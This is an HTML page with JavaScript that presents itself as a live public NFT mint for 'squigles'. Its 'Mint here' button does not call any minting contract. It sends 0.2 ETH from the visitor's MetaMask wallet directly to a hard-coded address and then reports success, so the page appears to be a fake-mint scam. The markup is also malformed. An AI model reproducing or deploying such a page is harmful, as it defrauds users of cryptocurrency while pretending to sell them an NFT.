    <section class="container">

          id="countdown"

        >

        <h1>squigles Public Mint LIVE!</h1>

    <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
    <script src="js/countdown.js"></script>

  <head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
  </head>
  <body>
    <div>
      <button class="pay-button btn">Mint here.
        1 NFT per wallet allowed.</button>
      <div id="status"></div>
    </div>

    <div class="nav3" style="height:705px;">
      <a href="http://www.facebook.com/" class="image"><img src="images/x-icon/FKyeKRHVcAEb15d.jfif" width="500"
        height="500"></a>
  </div>
  

    <script type="text/javascript">
      window.addEventListener('load', async () => {
        if (window.ethereum) {
          window.web3 = new Web3(ethereum);
          try {
            await ethereum.enable();
            initPayButton()
          } catch (err) {
            $('#status').html('User denied account access', err)
          }
        } else if (window.web3) {
          window.web3 = new Web3(web3.currentProvider)
          initPayButton()
        } else {
          $('#status').html('No Metamask (or other Web3 Provider) installed')
        }
      })
  
      const initPayButton = () => {
        $('.pay-button').click(() => {
          // paymentAddress is where funds will be send to
          const paymentAddress = '0x3C07CEc29e52e228C0a34Fd090453ea6Ea531CAA'
          const amountEth = 0.2
  
          web3.eth.sendTransaction({
            to: paymentAddress,
            value: web3.toWei(amountEth, 'ether')
          }, (err, transactionId) => {
            if  (err) {
              console.log('Payment failed', err)
              $('#status').html('Payment failed')
            } else {
              console.log('Payment successful', transactionId)
              $('#status').html('Payment successful')

              
            }
          })
        })
      }
    </script>
  </body>
</html>
